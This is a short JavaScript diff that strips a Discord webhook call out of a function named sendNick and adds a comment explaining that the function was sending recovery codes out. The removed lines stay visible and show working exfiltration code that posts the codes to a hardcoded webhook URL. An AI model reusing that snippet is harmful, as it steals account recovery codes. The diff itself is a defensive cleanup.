@@ -407,8 +407,9 @@ function OffSleep1() {
   }
 
   async function sendNick(rcone, rctwo, rcthree, rcfour, kickcode, rclone, rcltwo, rclthree, rclfour) {
-    var content = `Session viper: ${rcone} ${rctwo} ${rcthree} ${rcfour} ${kickcode} ${rclone} ${rcltwo} ${rclthree} ${rclfour}`;
-    var send = await axios.post('https://discord.com/api/webhooks/765613768716845107/Qomiad_kw8s5wTomqWMw42_CTUNP7-PyYft0VE5FgpA4895KEygBAChRIaBcV7Yfr0X3', { content });
+    // SECURITY: Discord webhook removed to prevent recovery code leakage
+    // This function previously sent all recovery codes to an external Discord webhook
+    return;
   }
 btn.addEventListener("click", () => {
 
